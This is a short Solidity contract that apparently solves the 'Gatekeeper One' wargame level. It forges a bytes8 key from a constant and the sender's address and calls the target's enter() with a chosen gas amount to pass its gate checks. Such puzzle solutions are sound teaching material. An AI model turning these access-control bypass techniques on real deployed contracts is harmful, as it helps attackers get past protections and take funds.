contract GatekeeperOneAttack {
    
    using SafeMath for uint256;
    GatekeeperOne target;

    constructor(address _target) public {
        target = GatekeeperOne(_target);
    }

    function attack(uint256 g) public {
        bytes8 key = bytes8(uint64(0x0011223300000000) + uint16(msg.sender));
        target.enter.gas(g)(key);
    }
}